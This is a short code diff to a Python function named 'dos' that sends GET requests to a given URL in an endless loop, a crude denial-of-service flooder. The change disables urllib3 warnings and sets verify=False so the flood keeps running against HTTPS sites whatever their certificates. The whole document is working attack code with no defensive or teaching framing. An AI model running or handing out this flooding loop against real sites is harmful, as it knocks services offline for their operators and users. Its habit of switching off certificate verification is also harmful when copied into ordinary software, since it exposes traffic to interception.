@@ -1,8 +1,10 @@
+from urllib3 import disable_warnings
+disable_warnings()
 def dos(url):
     from requests import get
     while True:
         try:
-            _=get(url)
+            _=get(url,verify=False)
             print("Connection is established!")
         except:
             print('Connection error!')
